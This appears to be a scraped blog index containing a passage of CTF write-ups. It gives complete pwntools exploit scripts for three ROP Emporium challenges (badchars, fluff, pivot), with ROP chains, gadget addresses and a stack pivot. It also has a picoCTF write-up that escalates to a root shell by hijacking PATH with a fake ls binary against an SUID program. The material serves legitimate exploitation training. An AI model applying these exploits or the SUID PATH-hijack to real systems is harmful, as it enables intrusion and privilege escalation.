31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from pwn import * p = process(\u0026#39;./badchars\u0026#39;) debug = False if debug: print(\u0026#34;gdb \u0026lt;bin\u0026gt; -q \u0026lt;pid\u0026gt; @ %d\u0026#34; % p.pid) pause() badchars = [b\u0026#39;x\u0026#39;, b\u0026#39;g\u0026#39;, b\u0026#39;a\u0026#39;, b\u0026#39;.\u0026#39;] pop_rdi = p64(0x00000000004006a3) xor = p64(0x0000000000400628) # xor byte ptr [r15], r14b ; ret pop_r12_r13_r14_r15 = p64(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret pop_r14_r15 = p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret mov_qword_ptr = p64(0x0000000000400634) # mov qword ptr [r13], r12 ; ret print_file_call = p64(0x0000000000400620) xor_byte = 0x3 flag_str = b\u0026#34;flag.txt\u0026#34; flag_file_xor = bytes([b ^ xor_byte for b in flag_str]) # xored reserved_addr_data = 0x000000000601030 # reserved data addr, free space payload = b\u0026#39;A\u0026#39;*32 + b\u0026#39;B\u0026#39;*8 payload += pop_r12_r13_r14_r15 payload += flag_file_xor payload += p64(reserved_addr_data) payload += p64(xor_byte) # r14; temp junk payload += p64(reserved_addr_data) # r15; temp junk payload += mov_qword_ptr for i in range(0, 8): payload += pop_r14_r15 payload += p64(xor_byte) # xor byte -\u0026gt; r14 payload += p64(reserved_addr_data + i) # byte addr -\u0026gt; r15 payload += xor payload += pop_rdi payload += p64(reserved_addr_data) payload += print_file_call # Send and interact p.sendline(payload) p.interactive() Chall 6: fluff 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #!/usr/bin/python3 from pwn import * io = process(\u0026#39;./fluff\u0026#39;) \u0026#34;\u0026#34;\u0026#34; Dump of assembler code for function questionableGadgets: 0x0000000000400628 \u0026lt;+0\u0026gt;: xlat BYTE PTR ds:[rbx] 0x0000000000400629 \u0026lt;+1\u0026gt;: ret 0x000000000040062a \u0026lt;+2\u0026gt;: pop rdx 0x000000000040062b \u0026lt;+3\u0026gt;: pop rcx 0x000000000040062c \u0026lt;+4\u0026gt;: add rcx,0x3ef2 0x0000000000400633 \u0026lt;+11\u0026gt;: bextr rbx,rcx,rdx 0x0000000000400638 \u0026lt;+16\u0026gt;: ret 0x0000000000400639 \u0026lt;+17\u0026gt;: stos BYTE PTR es:[rdi],al 0x000000000040063a \u0026lt;+18\u0026gt;: ret 0x000000000040063b \u0026lt;+19\u0026gt;: nop DWORD PTR [rax+rax*1+0x0] \u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34; xlat maps input bytes via lookup table \u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34; bextr extracts bits from rcx into rbx, rdx specifies the start bit and length via bitmask. \u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34; stos BYTE PTR es:[rdi],al stores al into memory at address in rdi We need pop rdi to pair this with as well as some gadgets concerning rbx and rcx to connect bextr and xlat in order to control al. Once al is controlled, we have full control over rdi so it should be easy from there. We know that we will need to use stos to write the bytes to bss. \u0026#34;\u0026#34;\u0026#34; add_al_bpl = p64(0x000000000040061e) pop_rbp = p64(0x0000000000400588) pop_rdi = p64(0x00000000004006a3) print_file_call = p64(0x0000000000400620) xlatb_ret = p64(0x0000000000400628) bextr_gadget = p64(0x000000000040062a) # single gadget: pop rdx; pop rcx; add rcx, 0x3ef2; bextr; ret flag_file = b\u0026#34;flag.txt\u0026#34; reserved_addr_bss = 0x0000000000601038 stos = p64(0x0000000000400639) initial_rax = 0xb # char addresses found by usual offsets after 0x4000000 char_addrs = [ 0x4003c4, # \u0026#39;f\u0026#39; 0x400239, # \u0026#39;l\u0026#39; 0x4003d6, # \u0026#39;a\u0026#39; 0x4003cf, # \u0026#39;g\u0026#39; 0x40024e, # \u0026#39;.\u0026#39; 0x400192, # \u0026#39;t\u0026#39; 0x400246, # \u0026#39;x\u0026#39; 0x400192, # \u0026#39;t\u0026#39; again ] payload = b\u0026#39;A\u0026#39; * 32 + b\u0026#39;B\u0026#39; * 8 for i in range(0, 8): payload += pop_rdi payload += p64(reserved_addr_bss + i) # shoved bss into rdi if i == 0: prev_al = initial_rax # first al is a section of rax, which is initially 0xb else: prev_al = flag_file[i-1] target_addr = char_addrs[i] rcx_val = target_addr - prev_al - 0x3ef2 # compensate for the instruction \u0026#34;add rcx, 0x3ef2\u0026#34; payload += bextr_gadget payload += p64(0x4000) # rdx -\u0026gt; rdx = bitmask for bextr (start bit=0, length=64) payload += p64(rcx_val) # rcx -\u0026gt; adjusted target addr offset payload += xlatb_ret # al = rbx[al] (the byte we want to write) is now in al payload += stos # store al into memory at address in rdi which we shoved in earlier payload += pop_rdi payload += p64(reserved_addr_bss) payload += print_file_call io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(payload) io.interactive() Chall 7: pivot 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from pwn import * import time elf = ELF(\u0026#39;./pivot\u0026#39;) libc = ELF(\u0026#39;libpivot.so\u0026#39;) io = process(elf.path) data = io.recv() for line in data.split(b\u0026#39;\\n\u0026#39;): if b\u0026#39;0x\u0026#39; in line: pivot_int = int(line.strip().split(b\u0026#39;0x\u0026#39;)[1], 16) break offset = libc.symbols[\u0026#39;ret2win\u0026#39;] - libc.symbols[\u0026#39;foothold_function\u0026#39;] print(f\u0026#34;offset: {hex(offset)}\u0026#34;) foothold = p64(0x0000000000400720) foothold_got_addr = elf.got[\u0026#39;foothold_function\u0026#39;] foothold_got = p64(foothold_got_addr) pop_rax_ret = p64(0x00000000004009bb) mov_rax_qword_ptr = p64(0x00000000004009c0) pop_rbp = p64(0x00000000004007c8) add_rax_rbp = p64(0x00000000004009c4) call_rax = p64(0x00000000004006b0) xchg_rsp_rax_ret = p64(0x00000000004009bd) rop_chain = b\u0026#39;\u0026#39; rop_chain += foothold rop_chain += pop_rax_ret rop_chain += foothold_got rop_chain += mov_rax_qword_ptr rop_chain += pop_rbp rop_chain += p64(offset) rop_chain += add_rax_rbp rop_chain += call_rax pivot_payload = b\u0026#39;A\u0026#39; * 32 + b\u0026#39;B\u0026#39; * 8 pivot_payload += pop_rax_ret pivot_payload += p64(pivot_int) pivot_payload += xchg_rsp_rax_ret io.sendline(rop_chain) io.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) io.sendline(pivot_payload) io.interactive() Chall 8: ret2csu ","date":"2025-05-21T00:00:00Z","image":"https://shuban-789.github.io/p/pwn-ropemp/cover_hu_74ec863dbc6087f8.png","permalink":"https://shuban-789.github.io/p/pwn-ropemp/","title":"ROP Emporium Full Solutions"},{"content":"Initial Stuff It is important to get familiar with the machine we log into so that we can find important assets such as possible vulnerabilities, which we may be able to exploit to get us root access.\nImportant Details A binary that lists a directory as root Why this is important: It does it as root via an SUID bit, because the root user made the executable How it works: It takes the input for the directory as an environment variable Other important takeaways: If it is listing the contents of a directory, it is most probably doing something with the ls binary SUID, short for Set User ID, is a special permission that can be assigned to executable files. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file\u0026rsquo;s owner.\nPlan Using the information we have gathered, we can try to assess vulnerabilities on the target system. So far, we have thought of environment variable injection so we can try to plan this out.\nWe make an ls binary that spawns a shell. Since the file has an SUID, this will give us a root shell if the binary we are manipulating uses ls (in which according to the hints, it does).\nThe Plan in Practice When \u0026ldquo;ls\u0026rdquo; is typed into the command line, the system looks through path for an executable with the name \u0026ldquo;ls\u0026rdquo;. So in the injected PATH, because /tmp is first, when the binary which runs ls as root runs \u0026ldquo;ls\u0026rdquo; as root it wil run the binary as root which will run /bin/bash root.\nActually Doing Stuff First, let\u0026rsquo;s log onto the machine. To logon, we will need to use ssh with the command format of:\nssh -p \u0026lt;port\u0026gt; \u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt;\nAfter logging on, letâ€™s list the environment variables, and try editing the PATH.\nIt looks like the injection worked, so we can move on to making the fake ls executable.\nFinally, we need to make the fake ls binary containing this C code:\n1 2 3 4 5 6 7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { system(\u0026#34;/bin/bash\u0026#34;); } then just run the bin\n","date":"2023-04-06T00:00:00Z","image":"https://shuban-789.github.io/p/picoctf-vne/cover_hu_b1fb187180ec1acf.jpg","permalink":"https://shuban-789.github.io/p/picoctf-vne/","title":"VNE Writeup"}]